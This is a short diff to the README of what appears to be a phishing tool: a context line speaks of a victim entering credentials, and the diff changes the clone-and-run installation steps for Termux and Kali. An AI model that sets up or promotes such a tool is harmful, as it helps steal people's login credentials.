@@ -12,14 +12,16 @@ When victim enter his credentials, you need to go to original website and use th
 ### INSTALLATION [ TERMUX APP --ANDROID ]
 * git clone https://github.com/Hemanth-Beast/whoami.git
 * cd whoami/
-* chmod 777 start.sh
+* chmod +x start.sh
+* chmod +x whoami@Hemanth.sh
 * ./start.sh
 * ./whoami@Hemanth.sh
 
 ### INSTALLATION [ KALI ]
 * git clone https://github.com/Hemanth-Beast/whoami.git
 * cd whoami/
-* chmod 777 setup.sh
+* chmod +x setup.sh
+* chmod +x Hemanth.sh
 * ./setup.sh
 * ./Hemanth.sh
 
